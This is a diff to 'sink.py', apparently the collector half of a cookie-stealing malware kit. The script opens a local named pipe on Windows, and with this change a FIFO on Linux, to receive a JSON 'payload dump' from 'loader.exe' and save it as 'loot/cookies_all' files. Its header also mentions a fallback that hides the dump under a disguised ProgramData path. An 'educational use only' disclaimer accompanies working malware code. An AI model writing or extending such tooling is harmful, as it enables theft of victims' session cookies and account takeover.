@@ -1,42 +1,63 @@
-# sink.py -- server for \\.\pipe\ck_pipe: receives the payload dump and writes it to disk.
+# sink.py -- receives the payload dump and writes it to disk.
+# Windows: named pipe \\.\pipe\ck_pipe (the payload's fallback). Linux: FIFO
+# /tmp/ck_pipe (same protocol: one JSON dump per connection, then EOF).
 #          Run BEFORE loader.exe: the payload waits ~10 s and, with nobody on the other side,
 #          dumps everything to C:\ProgramData\MediaCache\cache.json outside the reports.
 #
 #   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING.
 #   Only use on systems you own or are explicitly authorized to test.
-import ctypes, json, os, time
-from ctypes import wintypes
+import json, os, sys, time
+IS_WIN = (sys.platform == "win32")
+
+if IS_WIN:
+    import ctypes
+    from ctypes import wintypes
 
 PIPE, BUFSZ = r"\\.\pipe\ck_pipe", 1 << 20
+FIFO = "/tmp/ck_pipe"
 HERE  = os.path.dirname(os.path.abspath(__file__))
 LOOT  = os.path.join(HERE, "loot")
 os.makedirs(LOOT, exist_ok=True)
 TXT   = os.path.join(LOOT, "cookies_all.txt")
 JSONF = os.path.join(LOOT, "cookies_all.json")
 
-PIPE_ACCESS_DUPLEX, PIPE_UNLIMITED = 0x03, 255
-PIPE_REJECT_REMOTE_CLIENTS = 0x08
-ERROR_PIPE_CONNECTED, ERROR_BROKEN_PIPE = 534, 109
-INVALID = wintypes.HANDLE(-1).value                 # 0xFFFFFFFFFFFFFFFF, not -1
+if IS_WIN:
+    PIPE_ACCESS_DUPLEX, PIPE_UNLIMITED = 0x03, 255
+    PIPE_REJECT_REMOTE_CLIENTS = 0x08
+    ERROR_PIPE_CONNECTED, ERROR_BROKEN_PIPE = 534, 109
+    INVALID = wintypes.HANDLE(-1).value                 # 0xFFFFFFFFFFFFFFFF, not -1
 
-k32 = ctypes.WinDLL("kernel32", use_last_error=True)   # WinDLL = stdcall; use_last_error for GetLastError
-H, D, B, L = wintypes.HANDLE, wintypes.DWORD, wintypes.BOOL, wintypes.LPVOID
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)   # WinDLL = stdcall; use_last_error for GetLastError
+    H, D, B, L = wintypes.HANDLE, wintypes.DWORD, wintypes.BOOL, wintypes.LPVOID
 
-def proto(name, restype, *args):                     # NO handle call without this
-    f = getattr(k32, name); f.restype = restype; f.argtypes = list(args) or None
-    return f
+    def proto(name, restype, *args):                     # NO handle call without this
+        f = getattr(k32, name); f.restype = restype; f.argtypes = list(args) or None
+        return f
 
-CreateNamedPipeW    = proto("CreateNamedPipeW", H, wintypes.LPCWSTR, D, D, D, D, D, D, L)
-ConnectNamedPipe    = proto("ConnectNamedPipe", B, H, L)
-ReadFile            = proto("ReadFile", B, H, L, D, ctypes.POINTER(D), L)
-DisconnectNamedPipe = proto("DisconnectNamedPipe", B, H)
-CloseHandle         = proto("CloseHandle", B, H)
+    CreateNamedPipeW    = proto("CreateNamedPipeW", H, wintypes.LPCWSTR, D, D, D, D, D, D, L)
+    ConnectNamedPipe    = proto("ConnectNamedPipe", B, H, L)
+    ReadFile            = proto("ReadFile", B, H, L, D, ctypes.POINTER(D), L)
+    DisconnectNamedPipe = proto("DisconnectNamedPipe", B, H)
+    CloseHandle         = proto("CloseHandle", B, H)
 
 
 def serve():
     """Creates the pipe ONCE and keeps listening for connections in a loop on the same handle.
     Between DisconnectNamedPipe and ConnectNamedPipe the handle remains valid:
     there is no window where the pipe ceases to exist."""
+    if not IS_WIN:
+        # Linux: same protocol over a FIFO -- one JSON dump per connection, EOF ends it
+        try: os.unlink(FIFO)
+        except FileNotFoundError: pass
+        os.mkfifo(FIFO, 0o600)
+        print(f"[sink] listening on {FIFO}  (Ctrl+C to stop)")
+        while True:
+            with open(FIFO, "rb") as f:               # blocks until a writer opens the FIFO
+                print("[sink] client connected, reading...")
+                data = f.read()                        # EOF when the writer closes: dump complete
+            if data:
+                yield data
+            print("[sink] waiting for loader...")
     h = CreateNamedPipeW(PIPE, PIPE_ACCESS_DUPLEX, 0, PIPE_UNLIMITED,
                          BUFSZ, BUFSZ, PIPE_REJECT_REMOTE_CLIENTS, None)
     if h == INVALID:
